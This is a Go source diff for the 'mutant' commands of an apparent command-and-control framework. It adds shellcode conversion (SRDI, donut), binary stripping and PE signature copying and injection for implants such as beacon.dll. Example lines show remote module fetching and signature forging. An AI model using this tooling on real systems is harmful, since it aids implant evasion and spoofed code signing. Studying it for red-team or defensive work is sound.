@@ -2,58 +2,38 @@ package mutant
 
 import (
 	"github.com/carapace-sh/carapace"
+	"github.com/chainreactors/IoM-go/consts"
+	"github.com/chainreactors/IoM-go/proto/client/clientpb"
 	"github.com/chainreactors/malice-network/client/command/common"
-	"github.com/chainreactors/malice-network/client/repl"
-	"github.com/chainreactors/malice-network/helper/consts"
+	"github.com/chainreactors/malice-network/client/core"
 	"github.com/chainreactors/malice-network/helper/intermediate"
-	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
 	"github.com/chainreactors/mals"
 	"github.com/spf13/cobra"
 	"github.com/spf13/pflag"
 	"github.com/wabzsy/gonut"
 )
 
-func Commands(con *repl.Console) []*cobra.Command {
-	srdiCmd := &cobra.Command{
-		Use:   consts.CommandSRDI,
-		Short: "use srdi to generate shellcode",
-		Long: `Generate an SRDI (Shellcode Reflective DLL Injection) artifact to minimize PE (Portable Executable) signatures.
-
-SRDI technology reduces the PE characteristics of a DLL, enabling more effective injection and evasion during execution. The following options are supported:
-`,
+func Commands(con *core.Console) []*cobra.Command {
+	// Create mutant parent command
+	mutantCmd := &cobra.Command{
+		Use:   "mutant",
+		Short: "Malefic-mutant tools for PE/DLL manipulation",
+		Long:  "Tools for converting DLL to shellcode, stripping binaries, and PE signature manipulation",
 		RunE: func(cmd *cobra.Command, args []string) error {
-			return SRDICmd(cmd, con)
+			return cmd.Help()
 		},
-		Example: `~~~
-// Convert a DLL to SRDI format with build target
-srdi --path /path/to/target --target x86_64-pc-windows-msvc
-
-// Specify an entry function for the DLL during SRDI conversion
-srdi --path /path/to/target --target x86_64-pc-windows-msvc
-
-// Include user-defined data with the generated shellcode
-srdi --path /path/to/target.dll ---target x86_64-pc-windows-msvc --user_data_path /path/to/user_data --function_name DllMain
-
-// Convert a specific artifact to SRDI format using its ID
-srdi --id artifact_id --target x86_64-pc-windows-msvc
-~~~`,
 	}
-	common.BindFlag(srdiCmd, common.SRDIFlagSet)
-	common.BindFlagCompletions(srdiCmd, func(comp carapace.ActionMap) {
-		comp["target"] = common.BuildTargetCompleter(con)
-		comp["path"] = carapace.ActionFiles().Usage("file path")
-		comp["id"] = common.ArtifactCompleter(con)
-	})
 
+	// Donut command - standalone, not under mutant
 	donutCmd := &cobra.Command{
 		Use:   consts.CommandDonut,
 		Short: "donut cmd",
 		Long:  "Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory ",
 		Example: `
-  gonut -i c2.dll
-  gonut --arch x86 --class TestClass --method RunProcess --args notepad.exe --input loader.dll
-  gonut -i loader.dll -c TestClass -m RunProcess -p "calc notepad" -s http://remote_server.com/modules/
-  gonut -z2 -k2 -t -i loader.exe -o out.bin
+  donut -i c2.dll
+  donut --arch x86 --class TestClass --method RunProcess --args notepad.exe --input loader.dll
+  donut -i loader.dll -c TestClass -m RunProcess -p "calc notepad" -s http://remote_server.com/modules/
+  donut -z2 -k2 -t -i loader.exe -o out.bin
 `,
 		RunE: func(cmd *cobra.Command, args []string) error {
 			return DonutCmd(cmd, con)
@@ -141,15 +121,103 @@ srdi --id artifact_id --target x86_64-pc-windows-msvc
 	common.BindFlagCompletions(donutCmd, func(comp carapace.ActionMap) {
 		comp["input"] = carapace.ActionFiles().Usage("file path")
 	})
-	return []*cobra.Command{srdiCmd, donutCmd}
-}
 
-func Register(con *repl.Console) {
-	con.RegisterServerFunc("malefic_srdi", MaleficSRDI, &mals.Helper{
-		Group: intermediate.ArtifactGroup,
-		Short: "malefic srdi",
+	// SRDI command - DLL to Shellcode
+	srdiCmd := &cobra.Command{
+		Use:   "srdi",
+		Short: "Convert DLL to shellcode using SRDI",
+		Long:  "Generate SRDI shellcode from DLL files with support for TLS",
+		Example: `
+  mutant srdi -i beacon.dll -o beacon.bin
+  mutant srdi -i beacon.dll -a x64 --function-name ReflectiveLoader
+  mutant srdi -i beacon.dll -t malefic --userdata-path userdata.bin
+`,
+		RunE: func(cmd *cobra.Command, args []string) error {
+			return SrdiCmd(cmd, con)
+		},
+	}
+	common.BindFlag(srdiCmd, func(f *pflag.FlagSet) {
+		f.StringP("input", "i", "", "Source DLL file path")
+		f.StringP("output", "o", "", "Target shellcode path (default: <input>.bin)")
+		f.StringP("arch", "a", "x64", "Architecture: x86 or x64")
+		f.StringP("function-name", "", "", "Function name")
+		f.StringP("platform", "p", "win", "Platform: win")
+		f.StringP("type", "t", "malefic", "SRDI type: link (no TLS) or malefic (with TLS)")
+		f.StringP("userdata-path", "", "", "User data file path")
+		f.SortFlags = false
+	})
+	common.BindFlagCompletions(srdiCmd, func(comp carapace.ActionMap) {
+		comp["input"] = carapace.ActionFiles().Usage("DLL file path")
+		comp["output"] = carapace.ActionFiles().Usage("output file path")
+		comp["userdata-path"] = carapace.ActionFiles().Usage("userdata file path")
 	})
 
+	// Strip command - Remove paths from binary
+	stripCmd := &cobra.Command{
+		Use:   "strip",
+		Short: "Strip paths from binary files",
+		Long:  "Remove build paths and other sensitive information from binary files",
+		Example: `
+  mutant strip -i malefic.exe -o malefic-stripped.exe
+  mutant strip -i malefic.exe --custom-paths /home/user,/opt/build
+`,
+		RunE: func(cmd *cobra.Command, args []string) error {
+			return StripCmd(cmd, con)
+		},
+	}
+	common.BindFlag(stripCmd, func(f *pflag.FlagSet) {
+		f.StringP("input", "i", "", "Source binary file path")
+		f.StringP("output", "o", "", "Output binary file path (default: <input>.stripped)")
+		f.StringP("custom-paths", "", "", "Additional custom paths to replace (comma separated)")
+		f.SortFlags = false
+	})
+	common.BindFlagCompletions(stripCmd, func(comp carapace.ActionMap) {
+		comp["input"] = carapace.ActionFiles().Usage("binary file path")
+		comp["output"] = carapace.ActionFiles().Usage("output file path")
+	})
+
+	// Sigforge command - PE signature manipulation
+	sigforgeCmd := &cobra.Command{
+		Use:   "sigforge",
+		Short: "PE file signature manipulation tool",
+		Long:  "Extract, copy, inject, remove, or check PE file signatures",
+		Example: `
+  mutant sigforge --operation extract --source signed.exe --output signature.bin
+  mutant sigforge --operation copy --source signed.exe --target unsigned.exe --output result.exe
+  mutant sigforge --operation inject --source unsigned.exe --signature signature.bin --output signed.exe
+  mutant sigforge --operation remove --source signed.exe --output unsigned.exe
+  mutant sigforge --operation check --source target.exe
+`,
+		RunE: func(cmd *cobra.Command, args []string) error {
+			return SigforgeCmd(cmd, con)
+		},
+	}
+	common.BindFlag(sigforgeCmd, func(f *pflag.FlagSet) {
+		f.StringP("operation", "", "", "Operation: extract, copy, inject, remove, or check")
+		f.StringP("source", "s", "", "Source PE file")
+		f.StringP("target", "t", "", "Target PE file (for copy operation)")
+		f.StringP("signature", "", "", "Signature file (for inject operation)")
+		f.StringP("output", "o", "", "Output file path")
+		f.SortFlags = false
+	})
+	common.BindFlagCompletions(sigforgeCmd, func(comp carapace.ActionMap) {
+		comp["source"] = carapace.ActionFiles().Usage("source PE file")
+		comp["target"] = carapace.ActionFiles().Usage("target PE file")
+		comp["signature"] = carapace.ActionFiles().Usage("signature file")
+		comp["output"] = carapace.ActionFiles().Usage("output file path")
+	})
+
+	// Add subcommands to mutant parent command (excluding donut)
+	mutantCmd.AddCommand(srdiCmd, stripCmd, sigforgeCmd)
+
+	// Enable wizard for mutant commands that need configuration
+	common.EnableWizardForCommands(donutCmd, srdiCmd, stripCmd, sigforgeCmd)
+
+	// Return mutant as parent command and donut as standalone
+	return []*cobra.Command{mutantCmd, donutCmd}
+}
+
+func Register(con *core.Console) {
 	intermediate.RegisterFunction("exe2shellcode",
 		func(exe []byte, arch string, cmdline string) (string, error) {
 			bin, err := gonut.DonutShellcodeFromPE("1.exe", exe, arch, cmdline, false, true)
@@ -222,7 +290,7 @@ func Register(con *repl.Console) {
 		},
 	})
 
-	con.RegisterServerFunc("srdi", func(con *repl.Console, dll []byte, entry string, arch string, param string) (string, error) {
+	con.RegisterServerFunc("srdi", func(con *core.Console, dll []byte, entry string, arch string, param string) (string, error) {
 		bin, err := con.Rpc.DLL2Shellcode(con.Context(), &clientpb.DLL2Shellcode{
 			Bin:        dll,
 			Arch:       arch,
@@ -248,7 +316,7 @@ func Register(con *repl.Console) {
 		},
 	})
 
-	con.RegisterServerFunc("sgn_encode", func(con *repl.Console, shellcode []byte, arch string, iterations int32) (string, error) {
+	con.RegisterServerFunc("sgn_encode", func(con *core.Console, shellcode []byte, arch string, iterations int32) (string, error) {
 		bin, err := con.Rpc.ShellcodeEncode(con.Context(), &clientpb.ShellcodeEncode{
 			Shellcode:  shellcode,
 			Arch:       arch,
